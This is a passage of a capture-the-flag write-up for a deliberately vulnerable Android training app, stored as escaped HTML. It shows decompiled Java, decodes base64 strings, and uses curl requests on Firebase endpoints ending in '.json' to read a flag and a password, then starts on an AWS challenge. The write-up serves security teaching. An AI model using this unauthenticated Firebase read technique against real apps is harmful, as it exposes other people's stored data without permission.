    C&lt;span style=&#34;color:#5bc4bf&#34;&gt;((&lt;/span&gt;Toolbar&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt; findViewById&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;R&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;toolbar&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;));&lt;/span&gt;
    j&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;g&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;a&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#815ba4&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
    H&lt;span style=&#34;color:#5bc4bf&#34;&gt;();&lt;/span&gt;
    &lt;span style=&#34;color:#5bc4bf&#34;&gt;((&lt;/span&gt;FloatingActionButton&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt; findViewById&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;R&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;fab&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;)).&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;setOnClickListener&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#815ba4&#34;&gt;new&lt;/span&gt; a&lt;span style=&#34;color:#5bc4bf&#34;&gt;());&lt;/span&gt;
    SQLiteDatabase writableDatabase &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;u&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;getWritableDatabase&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;();&lt;/span&gt;
    ContentValues contentValues &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;new&lt;/span&gt; ContentValues&lt;span style=&#34;color:#5bc4bf&#34;&gt;();&lt;/span&gt;
    contentValues&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;put&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;title&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; Base64&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;decode&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;VGhlIGZsYWcgaGFzaCE=&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; 0&lt;span style=&#34;color:#5bc4bf&#34;&gt;));&lt;/span&gt;
    contentValues&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;put&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;subtitle&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; Base64&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;decode&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;MmFiOTYzOTBjN2RiZTM0MzlkZTc0ZDBjOWIwYjE3Njc=&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; 0&lt;span style=&#34;color:#5bc4bf&#34;&gt;));&lt;/span&gt;
    writableDatabase&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;insert&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;Thisisatest&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;null&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; contentValues&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
    contentValues&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;put&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;title&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; Base64&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;decode&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;VGhlIGZsYWcgaXMgYWxzbyBhIHBhc3N3b3JkIQ==&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; 0&lt;span style=&#34;color:#5bc4bf&#34;&gt;));&lt;/span&gt;
    contentValues&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;put&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;subtitle&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; h&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;c&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;());&lt;/span&gt;
    writableDatabase&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;insert&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;Thisisatest&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;null&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; contentValues&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
&lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From the analysis of the above code, the method is passing some base64 encoded strings and storing them into string variables.From the hint of application name, we are creating writable database through SQLiteDatabase functions. In this application we are writing some strings to the database. The name of the database being referenced is &lt;strong&gt;Thisisatest&lt;/strong&gt; database.&lt;/p&gt;
&lt;p&gt;Next step is decode all base64 encoded strings in order to understand the logic of the program. The decoded strings below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;VGhlIGZsYWcgaGFzaCE    - The flag hash! 
MmFiOTYzOTBjN2RiZTM0MzlkZTc0ZDBjOWIwYjE3Njc - 2ab96390c7dbe3439de74d0c9b0b1767
VGhlIGZsYWcgaXMgYWxzbyBhIHBhc3N3b3JkIQ  - The flag is also a password!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The above decoded strings gives us an hint on solving the challenge. The author provides us with the hash of the flag.&lt;/p&gt;
&lt;p&gt;The activity defines some interesting strings in the application, we decode the strings as shown in the code below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-kotlin&#34; data-lang=&#34;kotlin&#34;&gt;&lt;span style=&#34;color:#815ba4&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;final&lt;/span&gt; String w = &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;ZjFhZy1wYTU1&amp;#34;&lt;/span&gt;;   &lt;span style=&#34;color:#ef6155&#34;&gt;#&lt;/span&gt;f1ag-pa55
&lt;span style=&#34;color:#815ba4&#34;&gt;private&lt;/span&gt; byte[] x = Base64.decode(&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;c3FsaXRl&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f99b15&#34;&gt;0&lt;/span&gt;);  &lt;span style=&#34;color:#ef6155&#34;&gt;#&lt;/span&gt;sqlite
&lt;span style=&#34;color:#815ba4&#34;&gt;private&lt;/span&gt; byte[] y = Base64.decode(&lt;span style=&#34;color:#815ba4&#34;&gt;this&lt;/span&gt;.w, &lt;span style=&#34;color:#f99b15&#34;&gt;0&lt;/span&gt;);
&lt;span style=&#34;color:#815ba4&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;final&lt;/span&gt; String z;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Next is to analyze the FlagSevensqliteActivity in order to understand the usage of the above strings in our activity. Important strings form the above are &lt;strong&gt;f1ag-pa55&lt;/strong&gt; and &lt;strong&gt;sqlite&lt;/strong&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;
    &lt;span style=&#34;color:#815ba4&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;FlagSevenSqliteActivity&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;
        &lt;span style=&#34;color:#fec418&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;[]&lt;/span&gt; bArr &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;;&lt;/span&gt;      &lt;span style=&#34;color:#776e71&#34;&gt;//sqlite
&lt;/span&gt;&lt;span style=&#34;color:#776e71&#34;&gt;&lt;/span&gt;        d&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;bArr&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;decodedDirectoryOne&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
        Charset charset &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; StandardCharsets&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;UTF_8&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;;&lt;/span&gt;
        d&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;charset&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;StandardCharsets.UTF_8&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#815ba4&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;z&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;new&lt;/span&gt; String&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;bArr&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; charset&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#fec418&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;[]&lt;/span&gt; bArr2 &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;y&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;;&lt;/span&gt;        &lt;span style=&#34;color:#776e71&#34;&gt;//f1ag-pa55
&lt;/span&gt;&lt;span style=&#34;color:#776e71&#34;&gt;&lt;/span&gt;        d&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;bArr2&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;decodedDirectoryTwo&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
        Charset charset2 &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; StandardCharsets&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;UTF_8&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;;&lt;/span&gt;
        d&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;charset2&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;StandardCharsets.UTF_8&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#815ba4&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;A&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;new&lt;/span&gt; String&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;bArr2&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; charset2&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
        f b2 &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; f&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;();&lt;/span&gt;
        d&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;b2&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;FirebaseDatabase.getInstance()&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
        d d2 &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; b2&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;();&lt;/span&gt;
        d&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;d2&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;FirebaseDatabase.getInstance().reference&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#815ba4&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;B&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; d2&lt;span style=&#34;color:#5bc4bf&#34;&gt;;&lt;/span&gt;
        d h &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; d2&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;h&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#815ba4&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;z&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
        d&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;h&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;database.child(refDirectory)&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#815ba4&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;C&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; h&lt;span style=&#34;color:#5bc4bf&#34;&gt;;&lt;/span&gt;
        d h2 &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;B&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;h&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#815ba4&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;A&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
        d&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;h2&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;database.child(refDirectoryTwo)&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#815ba4&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;D&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; h2&lt;span style=&#34;color:#5bc4bf&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From the above decompiled &lt;strong&gt;flagSevensqliteActivity&lt;/strong&gt;, shows how the application is parsing the data from the firebase instance. In order to understand the data we are fetching, we need to know the nodes we are fetching the data from. From the decompiled code, we are accessing the string x as shown in the constructor method in line 1 through bArr byte array. our string is then passed to variable z constructor method as referenced by &lt;strong&gt;this.z&lt;/strong&gt; constructor.&lt;/p&gt;
&lt;p&gt;This means, &lt;strong&gt;f1ag-pa55&lt;/strong&gt; and &lt;strong&gt;sqlite&lt;/strong&gt; are our firebase nodes.&lt;/p&gt;
&lt;p&gt;To get the firebase link, we look for the link the &lt;strong&gt;strings.xml&lt;/strong&gt; in the resources directory of the application.The link of the firebase url is shown in the image below. Manually test firebase endpoints manually to see if they are vulnerable as shown in the code below. Adding .json at the end of the firebase endpoint enables one to read data.&lt;/p&gt;
&lt;p&gt;First we test our endpoint using &lt;strong&gt;sqlite&lt;/strong&gt; node.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;vx@archie:output$ curl https://injuredandroid.firebaseio.com/sqlite.json
&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;S3V3N_11&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From the results of the above, we get our flag. Accessing the endpoint using &lt;strong&gt;f1ag-pa55&lt;/strong&gt; using .json firebase trick, we get our password.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;vx@archie:output$ curl https://injuredandroid.firebaseio.com/f1ag-pa55.json
&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;hunter2&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;hunter2&lt;/strong&gt; is our correct password for the challenge.&lt;/p&gt;
&lt;h3 id=&#34;flag8---aws-storage-and-security&#34;&gt;FLag8 - AWS Storage and Security.&lt;/h3&gt;
&lt;p&gt;This challenge is about understanding the misconfiguration of AWS storage and security implementation in the android applications.&lt;/p&gt;
&lt;p&gt;The decompiled flagEightclass activity code looks like the one below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#815ba4&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;FlagEightLoginActivity&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;
